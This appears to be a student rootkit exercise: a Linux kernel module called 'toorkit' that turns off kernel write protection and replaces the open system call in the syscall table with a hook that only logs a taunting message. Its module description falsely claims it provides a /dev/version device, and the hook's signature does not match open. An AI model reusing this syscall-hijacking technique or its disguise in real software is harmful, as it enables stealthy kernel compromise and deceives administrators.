/*
** toorkit.c for toorkit
**
** Made by chauvo_t
** Login   <chauvo_t@epitech.net>
**
** Started on  Fri Oct 30 11:15:10 2015 chauvo_t
** Last update Fri Oct 30 19:37:51 2015 chauvo_t
*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/printk.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>

static int __init	toorkit_init(void);
static void __exit	toorkit_exit(void);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Maps pseudo-device /dev/version which gives the version of the running kernel.");
MODULE_AUTHOR("Thomas de Beauchene");

void	**sys_call_table_ptr;

asmlinkage int (*old_open)(int, const void *, size_t);

asmlinkage int new_open(int fd, const void *buf, size_t bytes)
{
	pr_info("MOUHAHAHAHAHAHAHAH !!! I'm the freak in the machine !\n");
	return old_open(fd, buf, bytes);
}

/* static void *find_syscall_table(void) */
/* { */
/* 	unsigned long	*ptr; */

/* 	ptr = kallsyms_lookup_name("sys_socketcall"); */
/* 	pr_info("ptr = %p\n", kallsyms_lookup_name("sys_open")); */
/* 	while (ptr < (unsigned long*)0xffffffff82010000) */
/* 	{ */
/* 		if (ptr[__NR_open] != kallsyms_lookup_name("sys_open")) */
/* 			return ptr; */
/* 		ptr += sizeof(void*); */
/* 	} */
/* 	return NULL; */
/* } */

static int __init toorkit_init(void)
{
        write_cr0(read_cr0() & (~0x10000));
	/* if ((sys_call_table_ptr = find_syscall_table()) == NULL) */
	/* 	return -1; */
	sys_call_table_ptr = kallsyms_lookup_name("sys_call_table");
	old_open = sys_call_table_ptr[__NR_open];
	sys_call_table_ptr[__NR_open] = new_open;
	write_cr0(read_cr0() | (0x10000));
	return 0;
}

static void __exit toorkit_exit(void)
{
        write_cr0(read_cr0() & (~0x10000));
	sys_call_table_ptr[__NR_open] = old_open;
	write_cr0(read_cr0() | (0x10000));
}

module_init(toorkit_init);
module_exit(toorkit_exit);
